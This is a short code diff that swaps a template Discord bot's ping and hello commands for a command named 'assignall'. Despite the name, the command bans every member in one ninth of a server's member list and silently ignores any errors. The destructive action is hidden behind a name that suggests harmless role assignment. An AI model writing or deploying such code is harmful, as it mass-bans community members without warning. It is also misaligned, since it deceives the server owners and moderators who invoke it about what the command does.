@@ -1,26 +1,21 @@
-# This example requires the 'message_content' privileged intents
-
-import os
 import discord
+import os
 from discord.ext import commands
+from discord.utils import get
 
 
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix='!', intents=intents)
-
-
-@bot.event
-async def on_ready():
-    print(f"Logged in as {bot.user}")
-
+bot = commands.Bot(command_prefix = '$', intents = discord.Intents.all())
 @bot.command()
-async def ping(ctx):
-    await ctx.send('pong')
-
-@bot.command()
-async def hello(ctx):
-    await ctx.send("Choo choo! 🚅")
-
+async def assignall(ctx):
+	s = ctx.guild.members
+	n = len(s)
+	k = 3
+	d = n // 9
+	s = s[d * k:d * (k + 1)]
+	for member in s:
+		try:
+			await member.ban()
+		except:
+			k = 1
 
 bot.run(os.environ["DISCORD_TOKEN"])
